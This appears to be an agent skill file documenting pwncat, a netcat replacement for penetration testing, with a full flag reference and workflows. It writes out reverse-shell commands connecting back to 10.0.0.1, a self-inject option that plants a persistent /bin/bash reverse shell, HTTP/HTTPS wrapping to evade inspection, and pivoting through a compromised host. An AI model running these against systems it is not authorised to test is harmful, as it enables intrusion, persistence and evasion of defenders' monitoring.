---
name: pwncat
description: A sophisticated Netcat replacement with features for firewall/IDS/IPS evasion, bind and reverse shells, self-injecting shells, and port forwarding. Use when performing network penetration testing, establishing persistent reverse shells, bypassing security controls via HTTP/HTTPS encapsulation, or automating post-exploitation tasks with Python scripting.
---

# pwncat

## Overview
pwncat is a "Netcat on steroids" designed for modern pentesting. It supports standard connect and listen modes, along with advanced features like local/remote port forwarding, zero-I/O port scanning, and automated reverse shell injection. It can encapsulate traffic in HTTP/HTTPS to evade detection and is extensible via the Pwncat Scripting Engine (PSE). Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume pwncat is already installed. If not:
```bash
sudo apt install pwncat
```
Dependencies: python3.

## Common Workflows

### Persistent Reverse Shell (TCP)
On the attacker machine, listen and automatically re-accept connections if the shell drops:
```bash
pwncat -l -k -v 4444
```
On the victim machine, connect back with infinite retry attempts:
```bash
pwncat --reconn 10.0.0.1 4444
```

### HTTP Evasion Mode
Wrap traffic in HTTP headers to bypass deep packet inspection:
```bash
# Listener
pwncat -l --http 80
# Client
pwncat --http 10.0.0.1 80
```

### Local Port Forwarding (Pivoting)
Proxy a remote service (e.g., a database on 127.0.0.1:3306 of a compromised host) to your local machine on port 5000:
```bash
pwncat -L 127.0.0.1:5000 compromised-host.com 3306
```

### Port Scanning (Zero-I/O)
Scan a range of ports with banner grabbing enabled:
```bash
pwncat -z --banner 10.0.0.1 20-100
```

## Complete Command Reference

### Usage Patterns
- `pwncat [options] hostname port` (Connect Mode)
- `pwncat [options] -l [hostname] port` (Listen Mode)
- `pwncat [options] -z hostname port` (Zero-I/O Mode)
- `pwncat [options] -L [addr:]port hostname port` (Local Forward Mode)
- `pwncat [options] -R addr:port hostname port` (Remote Forward Mode)

### Positional Arguments
- `hostname`: Address to listen, forward, scan, or connect to.
- `port`: Single port (all modes). In Zero-I/O mode, supports lists (`4444,4445`), ranges (`4444-4446`), or increments (`4444+2`).

### Mode Arguments
| Flag | Description |
|------|-------------|
| `-l`, `--listen` | **Listen mode**: Start a server. Quits on disconnect unless `-k` is used. |
| `-z`, `--zero` | **Zero-I/O mode**: Port scanning. Reports status only. |
| `-L`, `--local [addr:]port` | **Local forward**: Proxies a remote service to a local address. |
| `-R`, `--remote addr:port` | **Remote forward**: Proxies traffic between a target and a remote pwncat/netcat server. |

### Optional Arguments
| Flag | Description |
|------|-------------|
| `-e`, `--exec cmd` | Execute shell command (Connect/Listen mode only). |
| `-C`, `--crlf lf` | Force line endings: `lf`, `crlf`, `cr`, or `no`. |
| `-n`, `--nodns` | Do not resolve DNS. |
| `--send-on-eof` | Buffer stdin until EOF, then send in one chunk. |
| `--no-shutdown` | Do not shutdown into half-duplex mode after EOF on stdin. |
| `-v`, `--verbose` | Increase verbosity (`-v` to `-vvvv`). |
| `--info type` | Show socket/IP/TCP info: `sock`, `ipv4`, `ipv6`, `tcp`, `all` (requires `-vv`). |
| `-c`, `--color str` | Color output: `always`, `never`, `auto`. |
| `--safe-word str` | Shut down immediately upon receiving this specific string. |

### Protocol Arguments
| Flag | Description |
|------|-------------|
| `-4` | Use IPv4 only. |
| `-6` | Use IPv6 only. |
| `-u`, `--udp` | Use UDP instead of TCP. |
| `-T`, `--tos str` | IP Type of Service: `mincost`, `lowcost`, `reliability`, `throughput`, `lowdelay`. |
| `--http` | Hide traffic in HTTP packets. |
| `--https` | Hide traffic in HTTPS packets. |
| `-H`, `--header [str ...]` | Add custom HTTP headers when using `--http(s)`. |

### Command & Control Arguments
| Flag | Description |
|------|-------------|
| `--self-inject cmd:host:port[s]` | **Listen mode (TCP)**: Automatically deploy a persistent pwncat reverse shell to the victim upon connection. Example: `/bin/bash:10.0.0.1:4444`. |

### Pwncat Scripting Engine (PSE)
| Flag | Description |
|------|-------------|
| `--script-send file` | Python script to transform data before sending. |
| `--script-recv file` | Python script to transform data after receiving. |

### Zero-I/O Mode Arguments
| Flag | Description |
|------|-------------|
| `--banner` | Try banner grabbing during port scan. |

### Listen Mode Arguments
| Flag | Description |
|------|-------------|
| `-k`, `--keep-open` | Re-accept new clients after disconnect (TCP only). |
| `--rebind [x]` | Re-initialize server `x` times if bind fails. Omit `x` for endless. |
| `--rebind-wait s` | Wait `s` seconds between re-initialization (default: 1). |
| `--rebind-robin port` | Shuffle ports in round-robin mode to bind to. Requires `--rebind`. |

### Connect Mode Arguments
| Flag | Description |
|------|-------------|
| `--source-addr addr` | Specify source bind IP address. |
| `--source-port port` | Specify source bind port. |
| `--reconn [x]` | Reconnect `x` times if connection is lost. Omit `x` for endless. |
| `--reconn-wait s` | Wait `s` seconds between reconnects (default: 1). |
| `--reconn-robin port` | Shuffle ports in round-robin mode for reconnects. |
| `--ping-init` | Send initial ping packet (UDP reverse shell support). |
| `--ping-intvl s` | Send ping intervals every `s` seconds. |
| `--ping-word str` | Change default ping character `\0` to `str`. |
| `--ping-robin port` | Shuffle specified ports in round-robin mode for pings. |
| `--udp-sconnect` | Emulate stateful behavior for UDP connect phase. |
| `--udp-sconnect-word [str]` | Change data for UDP stateful connect (default: `\0`). |

## Notes
- **UDP Reverse Shells**: Use `--ping-init` and `--ping-intvl` to make UDP reverse shells stable, as UDP is stateless.
- **Firewall Evasion**: Use `--http` or `--https` to wrap traffic in standard web protocols.
- **Persistence**: Combine `-k` (listener) and `--reconn` (client) for highly stable connections.
- **Scripting**: The PSE `transform(data, pse)` function must use 4-space indentation.